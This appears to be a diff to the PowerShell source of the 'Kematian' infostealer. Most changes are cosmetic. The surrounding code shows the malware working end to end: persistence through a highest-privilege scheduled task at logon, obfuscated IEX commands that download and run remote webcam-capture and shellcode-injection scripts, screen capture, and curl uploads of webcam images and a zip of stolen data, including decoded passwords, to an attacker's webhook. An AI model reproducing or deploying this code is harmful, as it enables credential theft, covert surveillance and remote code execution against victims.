@@ -11,6 +11,9 @@ $settings = $false
 if (Test-Path -Path "$env:APPDATA\Kematian\settings.ps1") {
     $settings = $true
     . "$env:APPDATA\Kematian\settings.ps1"
+    if ($debug) {
+        Write-Host "[!] Settings Loaded" -ForegroundColor Green
+    }
 }
 
 if ($debug) {
@@ -90,7 +93,7 @@ function Invoke-TASKS {
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
+        Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
         Write-Host "[!] Task Created" -ForegroundColor Green
     }
     if ($blockhostsfile) {
@@ -166,7 +169,10 @@ function Backup-Data {
 `$fakeerror = `$$fakeerror
 `$persistence = `$$persistence
 "@
-
+        $settings | Out-File -FilePath "$env:APPDATA\Kematian\settings.ps1" -Encoding UTF8
+        if ($debug) {
+            Write-Host "[!] Settings Created" -ForegroundColor Green
+        }
     }
 
     #bulk data (added build ID with banner)
@@ -727,7 +733,7 @@ Pass: $decodedPass
 
     # Fix webcam hang with unsupported devices
 	
-    Write-Host "[!] Capturing an image with Webcam !"
+    Write-Host "[!] Capturing an image with Webcam !" -ForegroundColor Green
     $webcam = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
     $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
@@ -853,8 +859,7 @@ Pass: $decodedPass
     
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
-    Write-Host "`r `n"
-    Write-Host "[!] Injecting Shellcode !"
+    Write-Host "[!] Injecting Shellcode !" -ForegroundColor Green
     $kematian_shellcode = ("https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
@@ -864,7 +869,7 @@ Pass: $decodedPass
 
     $main_temp = "$env:localappdata\temp"
 
-     
+
     Add-Type -AssemblyName System.Windows.Forms, System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
@@ -896,7 +901,7 @@ Pass: $decodedPass
         $dirs | ForEach-Object { Remove-Item $_ -Force }
     } while ($dirs.Count -gt 0)
 	
-    Write-Host "[!] Getting information about the extracted data !"
+    Write-Host "[!] Getting information about the extracted data !" -ForegroundColor Green
     Write-Host "`r `n"
 	
     # Send info about the data in the Kematian.zip
@@ -1106,7 +1111,7 @@ FileZilla: $filezilla_info
     $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
     foreach ($item in $items) {
         $name = $item.Name
-        curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`"## :camera: Webcam\n\n\`", \`"avatar_url\`": \`"$avatar\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook | out-null
+        curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`"## :camera: Webcam\n\n\`", \`"avatar_url\`": \`"$avatar\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook | Out-Null
         Remove-Item -Path "$env:APPDATA\Kematian\$name" -Force
     }
 
@@ -1115,7 +1120,7 @@ FileZilla: $filezilla_info
 
     # send extracted data
     Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
-    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook
+    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook | Out-Null
     
     Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
     Write-Host "`r `n"
